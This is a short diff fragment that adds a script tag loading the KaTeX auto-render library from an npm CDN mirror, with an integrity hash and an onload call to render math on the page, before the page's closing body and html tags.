+<script src="https://npm.webcache.cn/katex@0.16.11/dist/contrib/auto-render.min.js" integrity="sha384-43gviWU0YVjaDtb&#x2F;GhzOouOXtZMP&#x2F;7XUzwPTstBeZFe&#x2F;+rCMvRwr4yROQP43s0Xk" crossorigin="anonymous" defer onload="renderMathInElement(document.body, {delimiters: [{left: &#39;$$&#39;, right: &#39;$$&#39;, display: true},{left: &#39;$&#39;, right: &#39;$&#39;, display: false}]});" data-pjax></script>
+
+  
+
+
+
+
+
+  </body>
+  </html>
+
